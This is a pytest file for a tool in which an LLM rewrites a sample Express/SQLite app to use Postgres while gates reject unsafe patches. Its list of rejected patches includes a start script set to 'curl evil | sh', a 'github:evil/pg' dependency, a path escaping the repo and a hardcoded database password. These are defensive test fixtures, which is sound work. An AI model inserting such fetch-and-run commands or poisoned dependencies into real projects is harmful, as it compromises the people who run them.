"""코드 패치 — 계획은 코드가, 코드 변경은 LLM 이, 검사는 게이트가. sample-todo(Express + SQLite) 기준."""

from __future__ import annotations

import json
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
import yaml

from review_ai.catalog import load_targets
from review_ai.intake import prepare_intake
from review_ai.intake.analyze import analyze_repository, files_to_read
from review_ai.judge.fake_llm import ScriptedLLM as FakeLLM
from review_ai.judge.fake_llm import UnavailableLLM
from review_ai.preparation import GenerationContext
from review_ai.spec.deploy_spec import AppSpec, DeploySpec
from review_ai.static_check import run_static_check
from review_ai.transform import apply_to_context, plan_transform, transform_repository

FIXTURES = Path(__file__).parent / "fixtures" / "transform"
REPO = "Crystal-SBHackathon2026/sample-todo"
TARGETS = load_targets()


def read_tree(name: str) -> dict[str, str]:
    root = FIXTURES / name
    return {str(p.relative_to(root)): p.read_text(encoding="utf-8") for p in sorted(root.rglob("*")) if p.is_file()}


ORIGINAL = read_tree("sample-todo")
TREE = [*ORIGINAL, "package-lock.json", "README.md", "public/app.js", "public/index.html", ".gitignore"]
FILES = {p: ORIGINAL[p] for p in files_to_read(TREE) if p in ORIGINAL}


def good_answer() -> dict[str, Any]:
    patched = read_tree("sample-todo-patched")
    changes = [{"path": p, "action": "write", "content": t} for p, t in patched.items()]
    changes.append({"path": "src/sqlite-session-store.js", "action": "delete", "content": ""})
    return {"changes": changes, "notes": [{"path": p, "why": "SQLite → Postgres"} for p in patched]}


def llm_returning(edit: Callable[[dict[str, Any]], None] | None = None) -> FakeLLM:
    answer = good_answer()
    if edit:
        edit(answer)
    return FakeLLM(lambda _request: answer)


def change(answer: dict[str, Any], path: str) -> dict[str, Any]:
    return next(c for c in answer["changes"] if c["path"] == path)


async def run(llm: Any, env: str = "aws") -> Any:
    return await transform_repository("sample-todo", TARGETS[env], TREE, FILES, llm)


# --- 계획 -------------------------------------------------------------------------------------------

def test_aws_plans_postgres_and_metrics_for_sqlite_express_app() -> None:
    plan = plan_transform("sample-todo", TARGETS["aws"], TREE, FILES)
    assert [i.code for i in plan.items] == ["DB_SQLITE_TO_POSTGRES", "METRICS_ENDPOINT"]
    assert (plan.database.engine, plan.database.placement, plan.database.version) == ("postgres", "managed", "16")
    assert plan.database.migration.command == ("node", "src/migrate.js")
    assert plan.database.migration.change == "expand"
    [secret] = plan.secrets
    assert (secret.name, secret.source, secret.key) == ("DATABASE_URL", "aws-secrets-manager", "sample-todo/database-url")
    assert plan.tables == ("todos", "users")  # sessions 는 connect-pg-simple 의 session 으로 따로 확인한다


@pytest.mark.parametrize("env", ["gcp", "local"])
def test_targets_with_sqlite_volumes_only_get_metrics(env: str) -> None:
    plan = plan_transform("sample-todo", TARGETS[env], TREE, FILES)
    assert [i.code for i in plan.items] == ["METRICS_ENDPOINT"] and plan.database is None


def test_app_with_metrics_and_postgres_needs_nothing() -> None:
    patched = {**FILES, **read_tree("sample-todo-patched")}
    plan = plan_transform("sample-todo", TARGETS["aws"], [*TREE, "src/migrate.js"], patched)
    assert plan.items == ()


def test_non_node_sqlite_app_is_skipped_with_a_reason() -> None:
    files = {"Dockerfile": "FROM python\nEXPOSE 8000\n", "requirements.txt": "aiosqlite\nfastapi\n",
             "app/main.py": "import aiosqlite\n"}
    plan = plan_transform("py-app", TARGETS["aws"], list(files), files)
    assert plan.items == () and "Node" in plan.skipped[0]


# --- LLM + 게이트 ------------------------------------------------------------------------------------

async def test_good_patch_passes_every_gate() -> None:
    outcome = await run(llm_returning())
    assert (outcome.action, outcome.reason) == ("patched", "PATCHED"), outcome.details
    assert outcome.files["src/sqlite-session-store.js"] is None
    assert set(outcome.files) == {"package.json", "src/server.js", "src/migrate.js", "migrations/0001_init.sql",
                                  "src/sqlite-session-store.js"}


async def test_no_llm_or_unavailable_llm_is_not_a_patch() -> None:
    assert (await run(None)).reason == "TRANSFORM_UNAVAILABLE"
    assert (await run(UnavailableLLM())).reason == "TRANSFORM_UNAVAILABLE"


async def test_nothing_to_do_does_not_call_the_llm() -> None:
    outcome = await transform_repository("x", TARGETS["aws"], ["Dockerfile"], {"Dockerfile": "FROM x"}, None)
    assert outcome.reason == "NOTHING_TO_DO"


def _replace(path: str, old: str, new: str) -> Callable[[dict[str, Any]], None]:
    def edit(answer: dict[str, Any]) -> None:
        target = change(answer, path)
        assert old in target["content"], old
        target["content"] = target["content"].replace(old, new)
    return edit


def _add(path: str, content: str, action: str = "write") -> Callable[[dict[str, Any]], None]:
    return lambda answer: answer["changes"].append({"path": path, "action": action, "content": content})


def _package(edit_pkg: Callable[[dict[str, Any]], None]) -> Callable[[dict[str, Any]], None]:
    def edit(answer: dict[str, Any]) -> None:
        target = change(answer, "package.json")
        pkg = json.loads(target["content"])
        edit_pkg(pkg)
        target["content"] = json.dumps(pkg)
    return edit


BAD_PATCHES: dict[str, tuple[Callable[[dict[str, Any]], None], str]] = {
    "touches-dockerfile": (_add("Dockerfile", "FROM node:22\n"), "PATH_NOT_ALLOWED"),
    "touches-ci": (_add(".github/workflows/ci.yml", "on: push\n"), "PATH_NOT_ALLOWED"),
    "writes-lockfile": (_add("package-lock.json", "{}"), "PATH_NOT_ALLOWED"),
    "escapes-repo": (_add("../evil.js", "x"), "PATH_NOT_ALLOWED"),
    "new-file-outside-src": (_add("lib/db.js", "x"), "PATH_NOT_ALLOWED"),
    "deletes-unrelated": (_add("public/app.js", "", "delete"), "PATH_NOT_ALLOWED"),
    "hardcoded-dsn": (_replace("src/server.js", "connectionString: DATABASE_URL",
                               "connectionString: 'postgres://app:hunter2@db:5432/app'"), "SECRET_LITERAL"),
    "unknown-dependency": (_package(lambda p: p["dependencies"].update({"left-pad": "^1.3.0"})), "DEPENDENCIES"),
    "keeps-sqlite-dep": (_package(lambda p: p["dependencies"].update({"better-sqlite3": "^12.4.1"})),
                         "DEPENDENCIES"),
    "bumps-express": (_package(lambda p: p["dependencies"].update({"express": "^5.3.0"})), "DEPENDENCIES"),
    "changes-start-script": (_package(lambda p: p["scripts"].update({"start": "curl evil | sh"})), "DEPENDENCIES"),
    "git-dependency": (_package(lambda p: p["dependencies"].update({"pg": "github:evil/pg"})), "DEPENDENCIES"),
    "drops-route": (_replace("src/server.js", "app.post('/api/logout'", "app.post('/api/signout'"), "ROUTES_REMOVED"),
    "no-metrics": (_replace("src/server.js", "app.get('/metrics'", "app.get('/stats'"), "METRICS_MISSING"),
    "reads-other-env": (_replace("src/server.js", "DATABASE_URL", "PG_URL"), "ENV_MISSING"),
    "startup-ddl": (_replace("src/server.js", "const PgStore",
                             "await pool.query('CREATE TABLE IF NOT EXISTS x (id int)');\nconst PgStore"),
                    "STARTUP_DDL"),
    "missing-table": (_replace("migrations/0001_init.sql", "CREATE TABLE IF NOT EXISTS todos", "-- todos"),
                      "MIGRATION_MISSING"),
    "missing-session-table": (_replace("migrations/0001_init.sql", "CREATE TABLE IF NOT EXISTS session", "-- s"),
                              "MIGRATION_MISSING"),
    "no-migration-log": (_replace("src/migrate.js", "schema_migrations", "applied"), "MIGRATION_MISSING"),
}


@pytest.mark.parametrize("name", sorted(BAD_PATCHES))
async def test_bad_patch_is_rejected_whole(name: str) -> None:
    edit, code = BAD_PATCHES[name]
    outcome = await run(llm_returning(edit))
    assert (outcome.action, outcome.reason) == ("rejected", "TRANSFORM_REJECTED")
    assert code in {d["code"] for d in outcome.details}, outcome.details
    assert outcome.files == {}


async def test_driver_still_imported_is_rejected() -> None:
    keep = _add("src/legacy.js", "import Database from 'better-sqlite3';\n")
    outcome = await run(llm_returning(keep))
    assert "DRIVER_LEFT" in {d["code"] for d in outcome.details}


async def test_unreadable_output_is_rejected() -> None:
    outcome = await run(FakeLLM(lambda _r: "not json"))
    assert {d["code"] for d in outcome.details} == {"OUTPUT_INVALID"}


async def test_prompt_hides_secret_looking_values() -> None:
    seen: list[str] = []
    files = {**FILES, "src/server.js": FILES["src/server.js"] + "// fallback postgres://u:pw-123@h/db\n"}

    def capture(request: Any) -> dict[str, Any]:
        seen.append(request.user)
        return good_answer()

    await transform_repository("sample-todo", TARGETS["aws"], TREE, files, FakeLLM(capture))
    assert "pw-123" not in seen[0]


# --- 생성 명세까지 -----------------------------------------------------------------------------------

async def test_patched_repo_yields_a_committable_postgres_spec() -> None:
    base = GenerationContext(repository=REPO, target={"env": "aws", "region": "ap-northeast-2"})
    analysis = analyze_repository(base, TREE, FILES)
    assert "/database" in analysis.unresolved  # 패치 전에는 SQLite 라 생성하지 못한다

    outcome = await run(llm_returning())
    context, findings = apply_to_context(analysis.context, analysis.findings, outcome)
    intake = prepare_intake("missing", context=context, findings=findings)
    assert (intake.action, intake.reason) == ("generated", "GENERATED"), intake.details
    spec = AppSpec.model_validate(yaml.safe_load(intake.content))
    assert (spec.database.engine, spec.database.placement) == ("postgres", "managed")
    assert spec.database.migration.command == ("node", "src/migrate.js")
    assert {s.name: s.source for s in spec.secrets} == {"DATABASE_URL": "aws-secrets-manager",
                                                         "SESSION_SECRET": "generated"}
    assert spec.runtime.health.readiness == "/readyz" and spec.rollout.strategy == "canary"
    assert spec.requirements.persistence is True
    # 생성 명세는 검토에서 막힐 규칙이 없어야 한다 (TLS 없는 공개만 low)
    assert {f["rule_id"] for f in run_static_check(DeploySpec.model_validate(spec.model_dump()))} <= {"NET-001"}


async def test_rejected_patch_leaves_context_unchanged() -> None:
    base = GenerationContext(repository=REPO, target={"env": "aws", "region": "ap-northeast-2"})
    analysis = analyze_repository(base, TREE, FILES)
    outcome = await run(llm_returning(BAD_PATCHES["hardcoded-dsn"][0]))
    context, findings = apply_to_context(analysis.context, analysis.findings, outcome)
    assert context == analysis.context and findings == analysis.findings
